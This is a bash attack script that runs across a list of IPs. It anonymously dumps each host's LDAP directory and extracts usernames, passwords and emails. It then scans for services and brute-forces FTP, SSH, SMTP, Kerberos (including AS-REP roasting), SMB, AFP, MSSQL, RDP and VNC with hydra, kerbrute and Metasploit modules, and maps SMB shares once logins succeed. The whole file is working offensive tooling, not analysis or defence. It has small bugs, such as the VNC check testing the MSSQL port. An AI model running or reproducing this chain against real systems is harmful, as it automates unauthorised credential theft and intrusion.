#!/bin/bash
for line in $(cat iplist)
do

#Get DN
DN=$(timeout 3 python3 getdn.py $line 2>/dev/null | grep -i "dc=" | head -n 1 | cut -d " " -f 5 )
DN=$(echo "$DN" | tr '[:upper:]' '[:lower:]')

#If DN Grabbed
if [[ ! -z "$DN" ]];then
echo "=============== [Info] ==============="
echo $line
echo $DN

#from DN to URL
urltmp=${DN//dc=/}
url=${urltmp//,/.}
echo $url

#Full dump
dump=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null)

if [[ -z "$dump" ]];then
echo "Empty Dump"
#timeout 3 python3 getdn.py $line
echo "======================================="
continue
fi

#Grab Users via username
echo "=========== [Users via username] ==========="
users=$(echo "$dump" | grep  "\<username: " | cut -d " " -f 2)
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 3
if [ "$nbusers" -gt 3 ]; then 
echo "..."
fi
echo "$users" > userlist

#Grab Passwds via password
echo "=========== [Passwds via password] ==========="
passwds=$(echo "$dump" | grep  "\<password: " | cut -d " " -f 2)
nbpasswds=$(echo "$passwds" | wc -l )
echo "$nbpasswds Passwds"
echo "$passwds" | head -n 3 
if [ "$nbpasswds" -gt 3 ]; then 
echo "..."
fi
echo "$passwds" > passwdslist


#Grab Users via uid
echo "=========== [Users via uid] ==========="
users=$(echo "$dump" | grep  "\<uid: " | cut -d " " -f 2)
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 3 
if [ "$nbusers" -gt 3 ]; then 
echo "..."
fi
echo "$users" >> userlist



#Grab Users via dn: uid
users=$(echo "$dump"  | grep "dn: uid=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
echo "=========== [Users via dn] ==========="
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 3 
if [ "$nbusers" -gt 3 ]; then 
echo "..."
fi
echo "$users" >> userlist

#Grab Users via member: cn

users=$(echo "$dump"  | grep "member: cn=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
echo "========= [Users via member] ========="
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 3
if [ "$nbusers" -gt 3 ]; then 
echo "..."
fi
echo "$users" >> userlist


#Grab Users via memberUid:

users=$(echo "$dump"  | grep "memberUid" | cut -d " " -f 2)
echo "======= [Users via memberUid] ========"
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 3
if [ "$nbusers" -gt 3 ]; then 
echo "..."
fi
echo "$users" >> userlist


#Grab Users via mail:

users=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  | cut -d "@" -f 1)
echo "========= [Users via mail] =========="
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 3 
if [ "$nbusers" -gt 3 ]; then 
echo "..."
fi
echo "$users" >> userlist

#Grab  mail:

mails=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  )
nbmails=$(echo "$mails" | wc -l )
echo "============== [Mail] ==============="
echo "$nbmails Mails"
echo "$mails" | head -n 3 
if [ "$nbmails" -gt 3 ]; then 
echo "..."
fi
echo "$mails" >> mails

#remove users duplicates

sort userlist | uniq -i > users
echo "=========== [Unique users] ==========="
users=$(cat users)
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 3 
if [ "$nbusers" -gt 3 ]; then 
echo "..."
fi



#Scan services if users found

if [[ ! -z "$users" ]];then
echo "=========== [Scan Services] ==========="
scan_res=$(nmap $line -p 21,22,25,88,389,445,548,1433,3389,5900)

ftp_svc=$(echo "$scan_res" | grep "21/tcp   open ")
ssh_svc=$(echo "$scan_res" | grep "22/tcp   open ")
smtp_svc=$(echo "$scan_res" | grep "25/tcp   open")
kerb_svc=$(echo "$scan_res" | grep "88/tcp   open")
#ldap_svc=$(echo "$scan_res" | grep "389/tcp  open")
smb_svc=$(echo "$scan_res" | grep "445/tcp  open")
afp_svc=$(echo "$scan_res" | grep "548/tcp  open")
vnc_svc=$(echo "$scan_res" | grep "1433/tcp open")
mssql_svc=$(echo "$scan_res" | grep "1433/tcp open")
rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")


#Bruteforce Services if found


#if [[ ! -z "$ldap_svc" ]];then
#echo "===> LDAP Open : Enum With Hydra Ldap_bruteforce (broken)"
#bash create_user_password_list.sh $line > userpass
#hydra -C userpass $line -m $DN ldap2 
#echo "===> LDAP Closed"
#fi

#FTP

if [[ ! -z "$ftp_svc" ]];then

	echo "===> FTP Open : BF With hydra ftp"
	echo "$(echo "$users" | wc -l ) Users"
	if [ "$nbusers" -lt 80 ]; then 

		echo "===> FTP Open : Few Users , Let's go"
		bash create_user_password_list.sh > userpass
		hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
		echo ""
		valid_user_pass_ftp=$(cat valid_user_pass_ftp)

		if [[ ! -z "$valid_user_pass_ftp" ]];then
			echo "===> FTP Open : Valid User(s) found :"
			echo "$valid_user_pass_ftp"
		else 
			echo "===> FTP Open : No Valid FTP User/Password found"
		fi

	else
		echo "===> FTP Open : Lot of users, are you sure (y/*)"
		read -t 5 ftpbrute

		if [ "$ftpbrute" == "y" ];then
			bash create_user_password_list.sh > userpass
			hydra -C userpass -I -V $line ftp | grep "login:" > valid_user_pass_ftp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
			valid_user_pass_ftp=$(cat valid_user_pass_ftp)
			
			if [[ ! -z "$valid_user_pass_ftp" ]];then
				echo "===> FTP Open : Valid User/Password found :"
				echo "$valid_user_pass_ftp"
			else 
				echo "===> FTP Open : No Valid FTP User/Password found"
			fi
		else
			echo "===> FTP Bruteforce Aborted"
		fi
	fi
else 
	echo "===> FTP Closed"
fi



#SSH

if [[ ! -z "$ssh_svc" ]];then
	echo "===> SSH Open : BF With hydra ssh"
	echo "$(echo "$users" | wc -l ) Users"


	if [ "$nbusers" -lt 80 ]; then 
		echo "===> SSH Open : Few Users , Let's go"
		bash create_user_password_list.sh > userpass
		hydra -C userpass -I -t 4 -V $line ssh | grep "login:"  > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
		valid_user_pass_ssh=$(cat valid_user_pass_ssh)
		if [[ ! -z "$valid_user_pass_ssh" ]];then
			echo "===> SSH Open : Valid SSH User/Password found"
			echo ""
			echo "$valid_user_pass_ssh"
		else 
			echo ""
			echo "===> SSH Open : No Valid SSH User/Password found"
		fi

	else
		echo "===> SSH Open : Lot of users, are you sure (y/*)"
		read -t 5 sshbrute
		if [ "$sshbrute" == "y" ];then
			bash create_user_password_list.sh > userpass
			hydra -C userpass -I -t 4 -V $line ssh | grep "login:" > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
			valid_user_pass_ssh=$(cat valid_user_pass_ssh)
			if [[ ! -z "$valid_user_pass_ssh" ]];then
				echo ""
				echo "===> SSH Open : Valid SSH User/Password found"
				echo "$valid_user_pass_ssh"
			else 
				echo ""
				echo "===> SSH Open : No Valid SSH User/Password found"
			fi

		else
			echo "===> SSH Bruteforce Aborted"
		fi
	fi
else 
	echo "===> SSH Closed"
fi

#SMTP
if [[ ! -z "$smtp_svc" ]];then
	echo "===> SMTP Open : Looking for mails"
	if [[ ! -z "$mails" ]];then
		echo "===> SMTP Open and mails dumped : Bruteforce with hydra smtp "
		bash create_mail_password_list.sh > mailpass
		hydra -C mailpass $line smtp -V
	else 
		echo "===> SMTP Open But no mails "
	fi
else
	echo "===> SMTP Closed"
fi


#KERBEROS
if [[ ! -z "$kerb_svc" ]];then
#GetNPUsers
	echo "===> Kerberos Open : Impacket GetNPUsers "
	timeout 60 impacket-GetNPUsers -dc-ip $line $url/ -usersfile users  || echo "I failed, perhaps due to time out"
	
#Kerbrute
	echo "===> Kerberos Open : Kerbrute "
	bash create_user_password_list.sh > userpass
	/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8 > valid_user_pass_kerbrute & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
	valid_user_pass_kerbrute=$(cat valid_user_pass_kerbrute)
	if [[ ! -z "$valid_user_pass_kerbrute" ]];then
		echo "===> Kerberos Open : Valid User(s)/Password(s) Found"
		echo "$valid_user_pass_kerbrute"
	else
		echo "===> Kerberos Open : No Valid User/Password Found"
	fi
else 
	echo "===> Kerberos Closed"
fi

#SMB
#bruteforce
if [[ ! -z "$smb_svc" ]];then
	echo "===> SMB Open : BF With MSF MODULE SMB_Login (CTRL+C to skip)"
	msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;" | grep "Success:" | cut -d "'" -f 2 > valid_user_pass_smb & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done

	valid_user_pass_smb=$(cat valid_user_pass_smb)


#map if user found
	if [[ ! -z "$valid_user_pass_smb" ]];then
		echo ""
		echo "===> SMB Open : Valid User(s)/Password(s) Found Let's map"
		echo "$valid_user_pass_smb"
		for validuserpass in $(cat valid_user_pass_smb)
		do
			validsmbuser=$(echo $validuserpass | cut -d "\\" -f 2  | cut -d ":" -f 1)
			echo ""
			echo "User: $validsmbuser, Pass: $validsmbuser, Domaine: $url"
			smbmap -H $line -u $validsmbuser -p $validsmbuser -d $url & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
		done
	else	
		echo ""
		echo "===> SMB Open : No Valid User/Password Found"
		
	fi
else 
	echo "===> SMB Closed"
fi

#AFP
if [[ ! -z "$afp_svc" ]];then
	echo "===> AFP Open : BF With MSF MODULE AFP_Login"
	msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;" | grep "Successful"  | cut -d " " -f 8 > valid_user_pass_afp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
	valid_user_pass_afp=$(cat valid_user_pass_afp)

	if [[ ! -z "$valid_user_pass_afp" ]];then
		echo ""
		echo "===> AFP Open : Valid User(s)/Password(s) Found"
		echo "$valid_user_pass_afp"
	else
		echo "===> AFP Open : No Valid User/Password Found"
	fi
else 
	echo "===> AFP Closed"
fi

#MSSQL
if [[ ! -z "$mssql_svc" ]];then
	echo "===> MSSQL Open : BF With Hydra MSSQL"
	bash create_user_password_list.sh > userpass
	hydra -C userpass $line mssql & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
else 
	echo "===> MSSQL Closed"
fi

#RDP
if [[ ! -z "$rdp_svc" ]];then
	echo "===> RDP Open : BF With Hydra RDP"
	bash create_user_password_list.sh > userpass
	hydra -t 1 -V -f -C userpass rdp://$line & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
else 
	echo "===> RDP Closed"
fi

#VNC
if [[ ! -z "$vnc_svc" ]];then
	echo "===> VNC Open : BF With hydra ftp"
	echo "$(echo "$users" | wc -l ) Users"
	if [ "$nbusers" -lt 80 ]; then 
		echo "===> VNC Open : Few Users , Let's go"
		bash create_user_password_list.sh > userpass
		hydra -C userpass -I -V $line vnc & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
	else
		echo "===> VNC Open : Lot of users, are you sure (yes/no)"
		read -t 5 vncbrute
		if [ "$vncbrute" == "yes" ];then
			bash create_user_password_list.sh > userpass
			hydra -C userpass -I -V $line vnc
		else
			echo "===> VNC Bruteforce Aborted"
		fi
	fi
else 
	echo "===> VNC Closed"
fi


#Fast scan if no services found
if [[  -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
echo "============= [Fast Scan] ============="
timeout 10 nmap $line  -F | grep open || echo "I failed, perhaps due to time out"
fi

else 


#Full dump if no users found
echo "============= [Full Dump] ============="
echo "$dump" 

fi
echo "======================================="
echo ""
echo ""
fi
done
